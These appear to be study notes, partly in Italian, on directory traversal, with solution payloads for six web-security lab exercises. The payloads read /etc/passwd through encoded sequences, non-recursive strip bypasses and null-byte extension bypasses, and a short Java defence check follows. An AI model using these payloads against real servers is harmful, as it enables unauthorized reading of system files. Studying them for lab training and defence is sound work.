
```
## Directory/Path Traversal:

Directory Traversal occurs when a web application allows unauthorized access to files and directories outside the intended or authorized directory structure.
The exposure of sensitive data can lead to data breaches and the leakage of confidential information
- http://example.com/download?file=user123.txt
- http://example.com/download?file=../../../../../etc/passwd



<img src="/loadImage?filename=218.png">
I file vengono archivhiati solitamente in "/var/www/images", quindi in /var/www/images/218.png.

A volte è possibile aggirare questo tipo di sanificazione tramite la codifica URL o anche la doppia codifica URL ../caratteri. Questo risulta in %2e%2e%2fE %252e%252e%252frispettivamente. Varie codifiche non standard, come ad esempio ..%c0%afO ..%ef%bc%8f, potrebbe anche funzionare. 

Di seguito è riportato un esempio di un semplice codice Java per convalidare il percorso canonico di un file in base all'input dell'utente:
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}

Linux:
/etc/passwd
filename=/var/www/images/../../../etc/passwd
filename=../../../etc/passwd%00.png



```

```
## Directory/Path Traversal - LAB Apprentice

#1. File path traversal, simple case
> ../../../etc/passwd
```


```
## Directory/Path Traversal - LAB Practitioner

#2. File path traversal, traversal sequences blocked with absolute path bypass
> Modify the filename parameter, giving it the value /etc/passwd.
> Observe that the response contains the contents of the /etc/passwd file. 



#3. File path traversal, traversal sequences stripped non-recursively
> Modify the filename parameter, giving it the value:
....//....//....//etc/passwd



#4. File path traversal, traversal sequences stripped with superfluous URL-decode
> Modify the filename parameter, giving it the value:
..%252f..%252f..%252fetc/passwd



#5. File path traversal, validation of start of path
> /var/www/images/../../../etc/passwd



#6. File path traversal, validation of file extension with null byte bypass
> ../../../etc/passwd%00.png

```
